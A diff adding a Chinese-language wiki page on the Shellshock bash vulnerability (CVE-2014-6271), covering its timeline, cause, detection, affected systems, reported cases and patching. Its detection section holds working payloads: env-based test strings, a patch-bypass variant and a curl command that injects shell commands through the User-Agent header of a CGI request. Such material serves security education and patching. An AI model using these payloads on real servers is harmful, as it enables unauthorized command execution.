@@ -1,0 +1,87 @@
+====== bash漏洞（shellshock） ======
+
+==== 1、漏洞简介 ====
+
+----
+CVE-2014-6271漏洞又称破壳漏洞，是Stéphane Chazelas（法国）于2014年9月中旬发现的SHELL的一个漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。该漏洞影响极其严重，修复过程也十分坎坷。时间线大致如下：
+
+9月24日：CVE-2014-6271被公开，补丁也快速形成，但因补丁修复不完整导致CVE-2014-7169；
+
+9月27日：因前两个漏洞补丁修复不完整导致CVE-2014-6277；
+
+9月30日：因在前三个漏洞补丁修复不完整导致CVE-2014-6278；
+
+9月28日：Bash的两个溢出漏洞又被公开CVE-2014-7186、CVE-2014-7187。
+
+
+==== 2、漏洞成因 ====
+
+----
+存在漏洞的bash会将形如<code bash>$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code>的字符解析为一个函数定义和一个command。导致任意命令执行。
+==== 3、漏洞检测及利用 ====
+
+----
+bash破壳漏洞本地检测
+官方验证版 
+<code bash>env x='() { :;}; echo vulnerable; bash -c "echo this is a test"</code>
+若系统bash存在漏洞则会打印出
+<code>
+vulnerable
+this is a test
+</code>
+
+官方patch绕过版
+<code bash>env -i X='() { (a)=>\' bash -c 'echo date'; cat echo</code>
+http cgi远程命令执行
+<code bash>curl -A "() { :; }; /bin/ls /; uname -a" http://www.aaa.com/bbb.cgi -v</code>
+==== 4、影响范围 ====
+
+----
+“破壳”是一个严重漏洞的别名，在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。
+
+此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用mod_cgi或mod_cgid的Apache服务器、DHCP客户端、SMTP服务器等其他使用bash作为解释器的应用。
+==== 5、实际案例 ====
+
+----
+[[http://www.wooyun.org/bugs/wooyun-2010-078387|中国医学科学院病原生物学研究所官网存在破壳漏洞]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-078029|华中农业大学-生物信息学中心-下某实验室网站存在破壳漏洞]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-077300|CSDN某业务Bash（CVE-2014-6271）漏洞导致系统可被入侵]]
+==== 6、漏洞修复 ====
+
+----
+安装最新的补丁
+
+在各种GNU/Linux发行版里需要升级：
+
+Debian-based（包括Ubuntu）:
+
+<code bash>sudo apt-get update && apt-get upgrade</code>
+Gentoo：
+
+<code>sudo emerge --sync && glsa-check -f affected</code>
+OpenSSH:
+
+<code>加入no-pty</code>
+
+==== 7、相关资源 ====
+
+----
+[[http://www.freebuf.com/articles/web/45520.html|从语法解析角度分析Bash破壳漏洞]]
+
+[[http://www.freebuf.com/news/48331.html|破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一]]
+
+[[http://www.freebuf.com/articles/system/48357.html|破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之二]]
+
+[[http://www.freebuf.com/articles/system/48406.html|破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之三]]
+
+[[http://www.freebuf.com/news/49292.html|Bash破壳漏洞（ShellShock）再变身：针对邮件服务器SMTP攻击]]
+
+[[http://www.freebuf.com/articles/system/50065.html|安全科普：让高大上的Bash破壳漏洞不再难理解（上）]]
+
+[[http://www.freebuf.com/articles/system/50707.html|安全科普：让高大上的Bash破壳漏洞不再难理解（下）]]
+
+[[http://drops.wooyun.org/papers/3064|CVE-2014-6271资料汇总]]
+
+[[http://drops.wooyun.org/papers/3268|Shellshock漏洞回顾与分析测试]]
